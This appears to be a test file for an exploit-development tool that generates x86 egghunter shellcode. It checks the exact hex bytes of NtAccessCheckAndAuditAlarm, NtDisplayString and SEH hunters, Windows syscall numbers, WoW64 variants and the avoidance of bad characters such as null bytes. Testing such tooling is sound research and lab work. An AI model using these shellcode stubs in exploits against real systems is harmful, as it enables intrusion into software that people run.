import { describe, expect, test } from "vitest";
import { buildEgghunter } from "../src/commands/egghunter";

const NO_BADCHARS: number[] = [];
const NULL_LF_CR = [0x00, 0x0a, 0x0d];
const DEFAULTS = { badchars: NO_BADCHARS, os: "win10", syscall: null };
const XP = { badchars: NO_BADCHARS, os: "xp", syscall: null };

const hexOf = (bytes: number[]) => bytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join("");

// Every short jump in a hunter loop goes back to `or dx/di, 0x0fff` (66 81 ...)
// or to the `inc` right after it.
function shortJumpTargets(bytes: number[]): { at: number; opcode: number; target: number }[] {
  const jumps: { at: number; opcode: number; target: number }[] = [];
  for (let i = 0; i + 1 < bytes.length; i++) {
    if (bytes[i] === 0xaf && bytes[i + 1] === 0x75) {
      jumps.push({ at: i + 1, opcode: 0x75, target: i + 3 + ((bytes[i + 2] << 24) >> 24) });
    }
    if (bytes[i] === 0x3c && bytes[i + 1] === 0x05) {
      const je = bytes.indexOf(0x74, i + 2);
      jumps.push({ at: je, opcode: 0x74, target: je + 2 + ((bytes[je + 1] << 24) >> 24) });
    }
  }
  return jumps;
}

function expectLoopTargets(bytes: number[], incOpcode: number): void {
  const jumps = shortJumpTargets(bytes);
  expect(jumps.length).toBeGreaterThanOrEqual(2);
  for (const jump of jumps) {
    if (jump.opcode === 0x74) {
      expect(bytes.slice(jump.target, jump.target + 2)).toEqual([0x66, 0x81]);
    } else {
      expect(bytes[jump.target]).toBe(incOpcode);
      expect(bytes.slice(jump.target - 5, jump.target - 3)).toEqual([0x66, 0x81]);
    }
  }
}

describe("NtAccess egghunter", () => {
  test("native Windows 10 stub is 35 bytes, null-free, with the tag after mov eax", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, ...DEFAULTS });
    expect(hexOf(result.bytes)).toBe("6681CAFF0F425231C066B8C901CD2E3C055A74ECB8573030548BFAAF75E7AF75E4FFE7");
    expect(result.size).toBe(35);
    expect(result.bytes).not.toContain(0x00);
    expect(result.syscallUsed).toBe(0x1c9);
  });

  test("embeds custom tag correctly", () => {
    const result = buildEgghunter({ tag: "B33F", mode: "ntaccess", wow64: false, ...DEFAULTS });
    expect(hexOf(result.bytes)).toContain("B842333346");
  });

  test("a number up to 0x7F loads with push imm8 ; pop eax", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NO_BADCHARS, os: "win7", syscall: null });
    expect(result.syscallUsed).toBe(0x02);
    expect(hexOf(result.bytes)).toContain("52" + "6A0258" + "CD2E");
    expect(result.size).toBe(32);
  });

  test("numbers with a zero byte use a null-free form", () => {
    const pick = (syscall: number) => buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: [0x00], os: null, syscall });
    expect(hexOf(pick(0x80).bytes)).toContain("52" + "31C0B080" + "CD2E");
    expect(hexOf(pick(0x100).bytes)).toContain("52" + "31C0B401" + "CD2E");
    for (const syscall of [0x80, 0x100, 0x1c8, 0x1af]) {
      expect(pick(syscall).badcharHits).toEqual([]);
    }
  });

  test("a syscall byte that is a bad character falls back to mov eax, ~n ; not eax", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NULL_LF_CR, os: null, syscall: 0x0a });
    expect(hexOf(result.bytes)).toContain("52" + "B8F5FFFFFFF7D0" + "CD2E");
    expect(result.badcharHits).toEqual([]);
  });

  test("syscall parameter overrides os preset", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NO_BADCHARS, os: "win7", syscall: 0x1c9 });
    expect(result.syscallUsed).toBe(0x1c9);
    expect(hexOf(result.bytes)).toContain("66B8C901");
  });

  test("native loop jumps land on or dx and inc edx for every encoding", () => {
    for (const syscall of [0x02, 0x80, 0x100, 0x1c9, 0x0a]) {
      const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NULL_LF_CR, os: null, syscall });
      expectLoopTargets(result.bytes, 0x42);
    }
  });

  test("WoW64 Windows 10 stub matches the 49 bytes that found an egg in a WOW64 process", () => {
    // Run on Windows 11 x64 with tests/manual/egghunter_wow64; exit code 1337 = egg reached.
    const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, ...DEFAULTS });
    expect(hexOf(wow64.bytes)).toBe("33DB53535353535353535353B3C06681CAFF0F4252526A295864FF135A5A3C0574ECB8573030548BFAAF75E7AF75E4FFE7");
    expect(wow64.size).toBe(49);
    expect(wow64.syscallUsed).toBe(0x29);
  });

  test.each([
    ["win10", null, 0x29],
    ["win11", null, 0x29],
    [null, 0x1c9, 0x1c9],
  ])("WoW64 stub for os %s syscall %s holds no 0x00, 0x0A or 0x0D", (os, syscall, expected) => {
    const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, badchars: NULL_LF_CR, os, syscall });
    expect(wow64.syscallUsed).toBe(expected);
    expect(wow64.bytes).not.toContain(0x00);
    expect(wow64.badcharHits).toEqual([]);
    expectLoopTargets(wow64.bytes, 0x42);
  });

  test("WoW64 syscall that is a bad character uses mov eax, ~n ; not eax, which also found the egg", () => {
    const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, badchars: [0x00, 0x29], os: "win10", syscall: null });
    expect(hexOf(wow64.bytes)).toBe("33DB53535353535353535353B3C06681CAFF0F425252B8D6FFFFFFF7D064FF135A5A3C0574E8B8573030548BFAAF75E3AF75E0FFE7");
    expect(wow64.badcharHits).toEqual([]);
  });

  test("WoW64 variant has no int 0x2e", () => {
    const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, ...DEFAULTS });
    expect(hexOf(wow64.bytes)).not.toContain("CD2E");
  });

  test("os table resolves native numbers per build", () => {
    const pick = (os: string) => buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NO_BADCHARS, os, syscall: null });
    expect(pick("xp").syscallUsed).toBe(0x02);
    expect(pick("win8.1").syscallUsed).toBe(0x1af);
    expect(pick("win10-1507").syscallUsed).toBe(0x1b7);
    expect(pick("WIN10-1909").syscallUsed).toBe(0x1c6);
    expect(pick("19041").syscallUsed).toBe(0x1c8);
    expect(pick("win10-22h2").syscallUsed).toBe(0x1c9);
    expect(pick("win10-2004").osWarning).toBeNull();
  });

  test("os with no native kernel falls back with a warning", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NO_BADCHARS, os: "win11", syscall: null });
    expect(result.syscallUsed).toBe(0x1c9);
    expect(result.osWarning).toContain("No NtAccessCheckAndAuditAlarm number for Windows 11 in this stub");
  });

  test("WoW64 on Windows 7 falls back with a warning", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, badchars: NO_BADCHARS, os: "win7", syscall: null });
    expect(result.syscallUsed).toBe(0x29);
    expect(result.osWarning).toContain("Windows 7");
  });

  test("reports badchar violations in stub bytes", () => {
    const withBad = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: [0x0f, 0xcd], os: "win10", syscall: null });
    expect(withBad.badcharHits.some((h) => h.includes("0x0F"))).toBe(true);
    expect(withBad.badcharHits.some((h) => h.includes("0xCD"))).toBe(true);
  });

  test("reports badchars in the tag itself", () => {
    const result = buildEgghunter({ tag: "A\x00BC", mode: "ntaccess", wow64: false, badchars: [0], os: "win10", syscall: null });
    expect(result.badcharHits.some((h) => h.includes("0x00"))).toBe(true);
  });
});

describe("NtDisplayString egghunter", () => {
  test("generates the 32-byte Skape stub with tag embedded", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...XP });
    expect(hexOf(result.bytes)).toBe("6681CAFF0F42526A4358CD2E3C055A74EFB8573030548BFAAF75EAAF75E7FFE7");
    expect(result.size).toBe(32);
    expect(result.badcharHits).toEqual([]);
    expect(result.syscallUsed).toBe(0x43);
  });

  test("custom syscall number is patched as single byte", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "win10", syscall: 0x55 });
    expect(result.syscallUsed).toBe(0x55);
    expect(hexOf(result.bytes)).toContain("6A5558");
  });

  test("is null-free with default syscall", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: [0x00], os: "xp", syscall: null });
    expect(result.badcharHits).toEqual([]);
  });

  test("has no WoW64 variant", () => {
    expect(() => buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: true, ...XP })).toThrow("ntdisplay has no WOW64 stub");
  });

  test("win7 preset uses NtDisplayString 0x6D", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "win7", syscall: null });
    expect(hexOf(result.bytes)).toContain("6A6D58");
    expect(result.osWarning).toBeNull();
  });

  test("rejects a number that does not fit push imm8", () => {
    expect(() => buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "vista", syscall: null })).toThrow("0x80 (Windows Vista) does not fit");
  });

  test("rejects the Windows 10 number, which needs imm32", () => {
    expect(() => buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "win10", syscall: null })).toThrow("0x143 (Windows 10 22H2) does not fit");
  });

  test("no os falls back to XP with a warning", () => {
    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: null, syscall: null });
    expect(result.syscallUsed).toBe(0x43);
    expect(result.osWarning).toContain("No os given; using 0x43 (Windows XP)");
  });
});

describe("SEH egghunter", () => {
  test("matches the 67 null-free bytes that found an egg with DEP off", () => {
    // tests/manual/egghunter_wow64 linked with /nxcompat:no; with DEP on, the handler
    // in VirtualAlloc memory is rejected, as it was for the 70-byte stub this replaces.
    const result = buildEgghunter({ tag: "W00T", mode: "seh", wow64: false, badchars: NULL_LF_CR, os: null, syscall: null });
    expect(hexOf(result.bytes)).toBe("EB255E31D25664FF3264892231FF6681CFFF0F47B857303054AF75F7AF75F4648F0283C404FFE7E8D6FFFFFF8B4C240C8B4424088B400483E81E83C17F89413931C0C3");
    expect(result.size).toBe(67);
    expect(result.badcharHits).toEqual([]);
    expect(result.syscallUsed).toBeNull();
  });

  test("the backward call lands on pop esi and the handler resumes at or di", () => {
    const { bytes } = buildEgghunter({ tag: "W00T", mode: "seh", wow64: false, ...DEFAULTS });
    const call = bytes.indexOf(0xe8);
    const rel = bytes[call + 1] | (bytes[call + 2] << 8) | (bytes[call + 3] << 16) | (bytes[call + 4] << 24);
    expect(bytes[call + 5 + rel]).toBe(0x5e);
    expect(bytes[1]).toBe(call - 2);
    const handler = call + 5;
    const sub = bytes.indexOf(0xe8, handler);
    expect(bytes[sub - 1]).toBe(0x83);
    expect(bytes.slice(handler - bytes[sub + 1], handler - bytes[sub + 1] + 3)).toEqual([0x66, 0x81, 0xcf]);
    expectLoopTargets(bytes, 0x47);
  });

  test("embeds custom tag", () => {
    const result = buildEgghunter({ tag: "HACK", mode: "seh", wow64: false, ...DEFAULTS });
    expect(hexOf(result.bytes)).toContain("47B84841434B");
  });
});

describe("egghunter tag padding", () => {
  test("pads short tags to 4 bytes with X", () => {
    const result = buildEgghunter({ tag: "AB", mode: "ntaccess", wow64: false, ...DEFAULTS });
    expect(hexOf(result.bytes)).toContain("B841425858");
  });

  test("truncates long tags to 4 bytes", () => {
    const result = buildEgghunter({ tag: "ABCDEF", mode: "ntaccess", wow64: false, ...DEFAULTS });
    expect(hexOf(result.bytes)).toContain("B8414243448BFA");
  });
});
